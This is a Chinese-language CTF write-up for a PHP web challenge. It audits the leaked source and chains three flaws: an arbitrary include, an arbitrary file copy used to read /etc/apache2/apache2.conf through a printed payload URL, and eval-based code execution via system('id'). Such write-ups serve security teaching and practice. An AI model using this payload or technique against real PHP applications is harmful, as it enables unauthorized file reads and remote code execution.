---
layout: post
title: 条条大路通罗马系列1 web writeup
category: writeup
tags: ctf
description:
---

[三个白帽][1]

0x00 代码审计
----
访问/sgbmwww.zip下载源码，里面只有sgbmwww里的内容.
功能是简单的反馈，表单经过自写的jsonencode()处理然后insert入库.


  `include.php`
定义了变量$_M['form']
第100行

    $_M['form'] =array();
    isset($_REQUEST['GLOBALS']) && exit('Access Error');
    foreach($_COOKIE as $_key => $_value) {
	        $_key{0} != '_' && $_M['form'][$_key] = daddslashes($_value);
    }
    foreach($_POST as $_key => $_value) {
         	$_key{0} != '_' && $_M['form'][$_key] = daddslashes($_value);
    }  
    foreach($_GET as $_key => $_value) {
	        $_key{0} != '_' && $_M['form'][$_key] = daddslashes($_value);
    }



cookie 和post,get 都是可控的.


 - 任意包含php
 在`index.php` 第6行

    include PATH_WEB . $_M['form']['class'].'.php';

`$_M['form']['class']`可控可惜后缀写死了php
 - 任意文件复制(实现读取)
`upfile.php`第64行
```
	if (move_uploaded_file($file_tmp, $file_name)) {
		$upfileok=1;
	} else if (copy($file_tmp, $file_name)) {
		$upfileok=1;
	}
```
这里`$file_tmp`可控,`$file_name`由`set_savename()`来控制.
如果`$_M['form']['is_rename']`为0`$_M['form']['name']`过滤一番然后赋值给$file_name

`$_M['form']`都可控.
payload:
```
/index.php?class=upfile&is_rename=0&formname[tmp_name]=/etc/apache2/apache2.conf&formname[name]=xx.2333
```
发送以后访问 /upload/xx.2333
得到
![][2]

发现并木有开放8080端口.
利用这个读取把`/var/www/html/sgbmadmin/index.php`读了。
 - 代码执行
sgbmadmin/index.php 第46行
`$content = jsondecode($row['content']);`
jsondecode()有个eval可控
通过eval来执行php代码。(配合上面的任意php include漏洞执行我们代码)
![][3]


利用发现的注入插入构造的代码

![2.png][4]

base64个system('id')
出来是这样的

![3.png][5]

ps:多谢大神的指点.

  [1]: http://www.sangebaimao.com
  
  [2]: https://img.scanfsec.com/img/2016051606574559.jpg
  [3]: https://img.scanfsec.com/img/2016054269772163.jpg
  [4]: https://img.scanfsec.com/img/2016051398011588.png
  [5]: https://img.scanfsec.com/img/201605999126804.png
